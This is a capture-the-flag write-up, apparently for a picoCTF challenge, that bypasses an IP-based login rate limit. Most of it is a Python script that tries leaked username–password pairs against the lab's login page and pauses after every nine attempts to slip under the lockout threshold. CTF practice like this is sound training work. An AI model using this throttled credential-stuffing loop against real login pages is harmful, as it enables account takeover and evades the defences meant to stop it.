# Fool the Lockout
Your friend is building a simple website with a login page.
To stop brute forcing and credential stuffing, they’ve added an IP-based rate limit: exceed the attempt threshold and your IP is blocked for a while. They’re convinced this makes guessing credentials impossible.
To test their defense, they’ve:
Created a dummy account with a random username–password pair from public credential lists.
Given you those username and password lists.
Shared the full source code.
Can you bypass the rate limit, log in, and capture the flag?

---
## Script
```
import requests
import time
import re

creds = []
with open('creds-dump.txt','r') as file:
	for line in file:
		user, pw = line.strip().split(";")
		creds.append((user,pw))

session = requests.Session()
login_url = "http://candy-mountain.picoctf.net:57779/login"
sleep = 32
batch_limit = 9

batch = 0
for user,pw in creds:

	if batch == batch_limit:
		print("Going to sleep")
		time.sleep(sleep)
		batch = 0
	r = requests.post(login_url,data={"username":user,"password":pw},allow_redirects=False)
	batch +=1
	if r.status_code ==302:
		print(f"FOUND: Username:{user} Password:{pw}")
		break
	
	
	
	
	



```
